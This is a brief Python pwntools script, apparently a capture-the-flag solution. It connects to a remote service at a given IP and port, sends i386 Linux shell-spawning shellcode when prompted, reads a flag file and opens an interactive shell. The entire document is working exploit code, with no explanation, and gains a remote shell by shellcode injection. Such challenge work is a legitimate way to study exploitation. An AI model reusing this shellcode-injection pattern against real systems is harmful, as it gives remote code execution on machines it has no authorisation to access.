from pwn import *

#sh = process('./bs1')

sh = remote('35.185.217.197' ,5252)
sh.sendlineafter('Send me stuff!!', asm(shellcraft.i386.linux.sh()))


sh.sendline("cat /home/ctf/flag.txt")

sh.interactive()
